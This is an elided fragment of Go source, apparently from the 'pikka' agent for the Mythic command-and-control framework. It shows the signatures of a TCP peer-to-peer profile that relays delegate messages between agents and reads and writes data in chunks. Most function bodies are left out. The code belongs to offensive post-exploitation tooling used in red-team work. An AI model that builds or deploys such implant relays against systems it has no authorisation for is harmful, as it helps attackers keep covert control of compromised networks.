...
import (
	...
	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/responses"
...
var (
	...
	pikkaChunkSize             = uint32(30000)
)

type pikkaTCP struct {
}

func (c pikkaTCP) ProfileName() string {
	return "tcp"
}
func (c pikkaTCP) ProcessIngressMessageForP2P(delegate *structs.DelegateMessage) {
	var err error = nil
...
func (c pikkaTCP) RemoveInternalConnection(connectionUUID string) bool {
	internalTCPConnectionMutex.Lock()
...
func (c pikkaTCP) AddInternalConnection(connection interface{}) {
...
func (c pikkaTCP) GetInternalP2PMap() string {
...
func (c pikkaTCP) GetChunkSize() uint32 {
	return pikkaChunkSize
}
func (c pikkaTCP) readFromInternalTCPConnections(newConnection *net.Conn, tempConnectionUUID string) {
...
func init() {
	registerAvailableP2P(pikkaTCP{})
}

func (c pikkaTCP) ChunkAndWriteData(conn net.Conn, data []byte) error {
	/*
...
func (c pikkaTCP) ReadAndChunkData(conn net.Conn) ([]byte, error) {
